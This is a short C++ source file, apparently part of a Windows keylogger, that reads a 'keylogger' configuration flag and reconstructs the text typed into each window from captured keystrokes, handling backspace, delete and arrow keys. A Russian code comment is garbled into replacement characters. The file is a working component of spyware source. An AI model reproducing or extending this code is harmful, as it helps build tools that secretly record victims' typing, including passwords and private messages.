#include "WordProcessor.h"

WordProcessor::WordProcessor(IGuardProcessor* processor): processor(processor) {
    app = NULL;
    editfeature = Poco::Util::Application::instance().config().getBool("application.keylogger.editfeatures", false);
}

void WordProcessor::process(Poco::Util::Application* _app, HWND window, std::string text, std::wstring str) {
    app = _app;
   /* const int MAX_TITLE_LENGTH = 1024;
    wchar_t title[MAX_TITLE_LENGTH];
    int length = GetWindowTextW(window, title, MAX_TITLE_LENGTH);*/

    std::wstring wTitle(text.begin(), text.end());
    Poco::SharedPtr<WindowInfo> sp1(new WindowInfo(app,wTitle, processor));
    Poco::SharedPtr<WindowInfo> sp2(sp1);

    if (mapWindows.find(window) == mapWindows.end()) {
        mapWindows.insert(Mymap::value_type(window, sp2));
    } 

    /*
    * ���� � ������� ����� �������� application.keylogger.editfeatures: true
    * �� ��������� ��������, ����������� �� ������ � �������
    */
    if (str == L"[BACKSPACE]")mapWindows.at(window)->removeChar(-1);
    else if ((str == L"[DELETE]") && editfeature )mapWindows.at(window)->removeChar(1);
    else if (str == L"[LEFT]" && editfeature)mapWindows.at(window)->moveLeft();
    else if (str == L"[RIGHT]" && editfeature)mapWindows.at(window)->moveRight();
    else
        mapWindows.at(window)->addChar(str);
}

size_t WordProcessor::countWindow() {
    return mapWindows.size();
}
